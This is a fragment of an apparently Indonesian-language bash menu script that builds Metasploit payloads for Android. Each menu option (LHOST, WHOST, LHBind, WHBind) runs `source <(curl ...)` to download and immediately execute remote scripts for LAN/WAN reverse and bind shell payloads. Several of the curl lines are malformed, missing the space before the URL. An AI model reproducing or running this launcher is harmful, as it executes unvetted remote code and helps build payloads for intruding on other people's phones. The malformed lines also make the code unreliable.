...
sleep 3
source <(curl -fsSL https://github.com/bohemianskode/Metasploit)
else
...
LHOST)
  ...
  source <(curl -fsSl https://github.com/bohemianskode/Metasploit/Payloads/main/Demo/LANAndroid.sh);;
  
WHOST)
  echo -e "${Green}Kamu Sedang Melakukan LHOST VHOST${clean}"
  source <(curl -fsSlhttps://github.com/bohemianskode/Metasploit/Payloads/main/Demo/WANAndroid.sh);;
  
LHBind)
  echo -e "${Green}Kamu Sedang Melakukan LHBind${clean}"
  source <(curl -fsSlhttps://github.com/bohemianskode/Metasploit/Payloads/main/Demo/LBIND.sh);;
WHBind)
  echo -e "${Green}Kamu Sedang Melakukan VHBind${clean}"
  source <(curl -fsSl https://github.com/bohemianskode/Metasploit/Payloads/main/Demo/WBIND.sh);;
*)
